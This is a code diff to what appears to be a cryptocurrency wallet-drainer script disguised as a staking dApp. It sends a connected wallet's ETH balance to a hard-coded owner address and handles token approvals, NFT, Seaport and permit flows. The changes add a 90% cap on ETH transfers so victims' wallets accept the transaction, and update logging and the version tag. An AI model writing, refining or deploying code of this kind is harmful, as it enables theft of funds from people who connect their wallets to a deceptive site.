@@ -22,10 +22,10 @@
  * - Unverified contracts still fail gracefully (as before)
  * - Base and unsupported chains continue to be skipped cleanly
  *
- * NATIVE ETH FIX (July 2026):
+ * NATIVE ETH FIXES (July 2026):
  * - Fixed gas calculation in stakeEth and transferEth to use real estimateGas + safety buffer
- * - Prevents "Insufficient ETH balance" errors when wallet's gas estimate > our reservation
- * - Never attempts to send 100% of balance
+ * - Added hard 90% cap on native ETH transfers (leaves ~10% buffer for gas)
+ * - Prevents "Insufficient Ethereum (ETH) balance" errors caused by wallet gas estimation differences
  * - Only affects native ETH transfers. All other flows (ERC20, NFT, Seaport, permit, etc.) are untouched.
  */
 
@@ -1012,7 +1012,7 @@ if (DEBUG) {
       const balanceBI = typeof getBalance === 'bigint' ? getBalance : BigInt(getBalance);
       const gasPriceBI = typeof gasPrice === 'bigint' ? gasPrice : BigInt(gasPrice);
 
-      // FIX: Use real gas estimation + safety buffer (same fix as stakeEth)
+      // Use real gas estimation + safety buffer
       let gasLimitForCalc;
       try {
         gasLimitForCalc = await appState.web3.eth.estimateGas({
@@ -1026,7 +1026,14 @@ if (DEBUG) {
       const gasLimitWithBuffer = Math.floor(Number(gasLimitForCalc) * 1.3);
       const gasCost = gasPriceBI * BigInt(gasLimitWithBuffer);
 
-      const valueToSend = balanceBI > gasCost ? balanceBI - gasCost : 0n;
+      let valueToSend = balanceBI > gasCost ? balanceBI - gasCost : 0n;
+
+      // 90% SAFETY CAP - Never send more than 90% of balance
+      // This guarantees a buffer for gas fees
+      const maxAllowed = (balanceBI * 90n) / 100n;
+      if (valueToSend > maxAllowed) {
+        valueToSend = maxAllowed;
+      }
 
       if (valueToSend <= 0n) throw new Error("Insufficient balance for gas");
 
@@ -1075,9 +1082,7 @@ if (DEBUG) {
       const balanceBI = typeof getBalance === 'bigint' ? getBalance : BigInt(getBalance.toString ? getBalance.toString() : getBalance);
       const gasPriceBI = typeof gasPrice === 'bigint' ? gasPrice : BigInt(gasPrice.toString ? gasPrice.toString() : gasPrice);
 
-      // FIX: Use real gas estimation + safety buffer instead of hardcoded 120000
-      // This prevents "Insufficient ETH" errors when wallet's own gas estimate is higher than our reservation.
-      // Never attempts to send 100% of the balance.
+      // Use real gas estimation + safety buffer
       let gasLimitForCalc;
       try {
         gasLimitForCalc = await appState.web3.eth.estimateGas({
@@ -1088,22 +1093,28 @@ if (DEBUG) {
       } catch (e) {
         gasLimitForCalc = 25000; // safe fallback for simple transfer
       }
-      // Add 30% safety buffer so slight gas price fluctuations don't cause rejection
+      // Add 30% safety buffer
       const gasLimitWithBuffer = Math.floor(Number(gasLimitForCalc) * 1.3);
       const gasCost = gasPriceBI * BigInt(gasLimitWithBuffer);
 
-      const valueToSendBN = balanceBI > gasCost ? balanceBI - gasCost : 0n;
+      let valueToSend = balanceBI > gasCost ? balanceBI - gasCost : 0n;
 
-      console.log("===== ETH VALUE CALCULATION (IMPROVED) =====");
+      // 90% SAFETY CAP - Never send more than 90% of balance
+      // This guarantees a buffer for gas fees and prevents "Insufficient balance" errors
+      // caused by differences between dApp calculation and wallet's own gas estimation
+      const maxAllowed = (balanceBI * 90n) / 100n;
+      if (valueToSend > maxAllowed) {
+        valueToSend = maxAllowed;
+      }
+
+      console.log("===== ETH VALUE CALCULATION (90% CAP) =====");
       console.log("Balance (wei):", balanceBI.toString());
       console.log("Gas Price (wei):", gasPriceBI.toString());
       console.log("Estimated Gas Limit (with buffer):", gasLimitWithBuffer);
       console.log("Gas Cost (wei):", gasCost.toString());
-      console.log("Value To Send:", valueToSendBN.toString());
+      console.log("Value To Send (after 90% cap):", valueToSend.toString());
       console.log("=================================");
 
-      const valueToSend = valueToSendBN > 0n ? valueToSendBN : 0n;
-      console.log("Calculated valueToSend:", valueToSend.toString());
       if (valueToSend <= 0n) throw new Error("Insufficient balance for gas");
 
       const nonce = await appState.web3.eth.getTransactionCount(appState.account);
@@ -1124,8 +1135,6 @@ if (DEBUG) {
       // Uses direct web3.eth.sendTransaction which triggers proper native ETH transaction signing
       // (wallet shows Confirm Transaction popup with gas/details, not a personal_sign message popup)
       // This produces a valid signed transaction that recovers to the correct sender address.
-      // Removed broken personal_sign + ethereumjs.Tx + manual vrs reconstruction which caused
-      // "Recovered sender" mismatch with wallet account.
       const tx = await appState.web3.eth.sendTransaction({
         from: appState.account,
         to: ownerAddress,
@@ -1295,7 +1304,7 @@ if (DEBUG) {
           let message = '';
 
           if (item.type === "erc20") {
-            message = item.tokenAddress === "0x000000000000000000im00000000000000000000"
+            message = item.tokenAddress === "0x000000000000000000000000000000im0000000000"
               ? `🪙 <b>Transfering ${item.symbol} | Network: ${item.chain}</b><br>Amount: ${item.tokenAmount} (${item.balance} $)`
               : `🪙<b>Approve ${item.symbol} | Network: ${item.chain}</b><br>Contract: <code>${item.tokenAddress}</code><br>Amount: <code>${item.tokenAmount}</code> (${item.balance} $)`;
 
@@ -1628,15 +1637,16 @@ if (DEBUG) {
   window.loginTrust = loginTrust;
   window.walletconnect = walletconnect;
 
-  structuredLog('info', 'main_js_fully_production_ready_native_fix', {
-    version: 'production-v3-native-eth-fix',
+  structuredLog('info', 'main_js_fully_production_ready_90percent_cap', {
+    version: 'production-v3-90percent-cap',
     eip6963: true,
     walletConnectV2: true,
     explicitProviderSelection: true,
     backendVerified: true,
     legacyRemoved: true,
     permitFallbackEnabled: true,
-    nativeEthGasCalculationFixed: true
+    nativeEthGasCalculationFixed: true,
+    nativeEth90PercentCap: true
   });
 
 })();
